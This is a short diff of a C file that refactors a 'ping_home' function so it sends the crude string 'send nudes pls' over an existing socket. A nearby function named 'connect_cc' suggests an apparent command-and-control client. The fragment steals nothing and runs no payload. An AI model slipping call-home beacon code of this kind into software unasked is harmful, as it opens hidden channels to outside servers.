@@ -43,17 +43,11 @@ int connect_cc(char *ip_adrr, int port, int *socket_desc,
 	return OK;
 }
 
-int ping_home(char *ip_addr, int port)
+int ping_home(int *socket_desc)
 {
-	int socket_desc = 0;
-	struct sockaddr_in server;
-
-	if (connect_cc(ip_addr, port, &socket_desc, &server, 0) == ERROR) {
-		printf("Error connecting to the server\n");
-		return ERROR;
-	}
-
-	send(socket_desc, "send nudes pls", STD_SIZE, 0);
+	printf("Asking for nudes\n");
+	send(*socket_desc, "send nudes pls", STD_SIZE, 0);
+	sleep(1);
 
 	return OK;
 }
